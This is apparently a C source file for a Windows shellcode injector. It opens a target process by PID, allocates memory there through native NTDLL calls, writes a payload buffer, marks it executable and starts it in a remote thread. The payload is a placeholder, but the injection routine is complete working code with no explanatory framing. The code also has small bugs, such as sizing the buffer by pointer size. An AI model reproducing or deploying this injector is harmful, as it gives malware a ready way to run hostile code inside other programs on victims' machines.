#include <windows.h>
#include <stdio.h>
#include "NTAPI_Funcs.h"

#define ALIGNMENT 8  

// Function to check if a pointer is aligned to a specific alignment
BOOL IsAlignedTo(size_t alignment, void* ptr) {
    return ((uintptr_t)ptr % alignment) == 0;
}

// Function to get a module handle
HMODULE GetMod(IN LPCWSTR moduleName) {
    HMODULE hModule = NULL;
    info("Trying to get a handle to %ls", moduleName);

    hModule = GetModuleHandleW(moduleName);

    if (hModule == NULL) {
        Warning("failed to get handle to the module, error 0x%lx\n", GetLastError());
        return NULL;
    }
    else {
        okay("Got handle on the module : %s \n", moduleName);
        info("\\______[ %s _0x%p]", moduleName, hModule);
        return hModule;
    }
}

int main(int argc, char* argv[]) {
    DWORD PID, TID = NULL;
    HANDLE hProcess, hThread = NULL;
    LPVOID rBuffer = NULL;
    HMODULE hNTDLL = NULL;
    NTSTATUS STATUS, STATUS_MEM, STATUS_Write, STATUS_THREAD, STATUS_OBJECT, STATUS_Protect = NULL;
    DWORD OldProtection = 0;
    SIZE_T BytesWritten = 0;

    PBYTE R0m4InShell = (PBYTE)"\x41\x41\x41"; // Pointer to Shellcode.

    SIZE_T szR0m4 = sizeof(R0m4InShell);
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    PID = atoi(argv[1]);
    CLIENT_ID CID = { (HANDLE)PID, NULL };

    if (argc < 2) {
        Warning("Usage : Ntapi_Injector.exe PID");
        return EXIT_FAILURE;
    }

    hNTDLL = GetMod(L"NTDLL");

    //-------Here we start Populating the function of the NTAPI-------------

    info("Populating function prototypes...");

    NtOpenProcess R0m4OpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtCreateThreadEx R0m4CreateThread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtClose R0m4Close = (NtClose)GetProcAddress(hNTDLL, "NtClose");
    NtAllocateVirtualMemory R0m4Allocates = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory R0m4Writes = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    NtCreateThreadEx R0m4Executes = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtWaitForSingleObject R0m4WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hNTDLL, "NtWaitForSingleObject");
    NtProtectVirtualMemory R0m4ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hNTDLL, "NtProtectVirtualMemory");

    okay("Beginning of the magic Injection");

    // Here the injection starts -------------------//

    STATUS = R0m4OpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS != STATUS_SUCCESS) {
        Warning("[NtOpenProcess] failed to get a handle on the process, error 0x%lx", STATUS);
        goto CleanUp;
    }

    // Check if the alignment of the buffer is correct
    if (!IsAlignedTo(ALIGNMENT, rBuffer)) {
        Warning("Buffer is not properly aligned!");
        goto CleanUp;
    }

    // Allocate memory in the target process
    STATUS = R0m4Allocates(hProcess, &rBuffer, NULL, &szR0m4, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        Warning("[NtAllocateVirtualMemory] failed to allocate memory, error 0x%lx", STATUS);
        goto CleanUp;
    }

    // Check if the alignment of the allocated memory is correct
    if (!IsAlignedTo(ALIGNMENT, rBuffer)) {
        Warning("Allocated memory is not properly aligned!");
        goto CleanUp;
    }
    if (IsAlignedTo(ALIGNMENT, rBuffer)) {
        Warning("Allocated memory is  properly aligned!");
    }

    // Write shellcode to allocated memory
    STATUS_Write = R0m4Writes(hProcess, rBuffer, R0m4InShell, szR0m4, &BytesWritten);
    if (STATUS_Write != STATUS_SUCCESS) {
        Warning("[NtWriteVirtualMemory] failed to write memory, error 0x%lx", STATUS_Write);
        goto CleanUp;
    }
    okay("[0x%p] [RW-] wrote %zu-bytes to the allocated buffer!", rBuffer, BytesWritten);


    // Check if the alignment of the written memory is correct
    if (!IsAlignedTo(ALIGNMENT, rBuffer)) {
        Warning("Written memory is not properly aligned!");
        goto CleanUp;
    }

    // Change memory protection to executable
    STATUS_Protect = R0m4ProtectVirtualMemory(hProcess, &rBuffer, &szR0m4, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_Protect != STATUS_SUCCESS) {
        Warning("[NtProtectVirtualMemory] failed to change memory protection, error 0x%lx", STATUS_Protect);
        goto CleanUp;
    }

    okay("[0x%p] [R-X] changed allocated buffer protection to PAGE_EXECUTE_READ [R-X]!", rBuffer);


    // Create remote thread
    STATUS_THREAD = R0m4Executes(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (STATUS_THREAD != STATUS_SUCCESS) {
        Warning("[NtCreateThreadEx] failed to create remote thread, error 0x%lx", STATUS_THREAD);
        goto CleanUp;
    }
    okay("[0x%p] successfully created a thread!", hThread);
    info("[0x%p] waiting for thread to finish execution...", hThread);
    

    // Wait for the remote thread to complete
    STATUS_OBJECT = R0m4WaitForSingleObject(hThread, FALSE, NULL);
    if (STATUS_OBJECT != STATUS_SUCCESS) {
        Warning("[NtWaitForSingleObject] failed to wait for the thread, error 0x%lx", STATUS_OBJECT);
        goto CleanUp;
    }
    info("[0x%p] thread finished execution! beginning cleanup...", hThread);


    info("Injection completed successfully!");

CleanUp:
    if (hThread != NULL) R0m4Close(hThread);
    okay("Thread was closed");
    if (hProcess != NULL) R0m4Close(hProcess);
    okay("process was closed");
    return EXIT_SUCCESS;
}
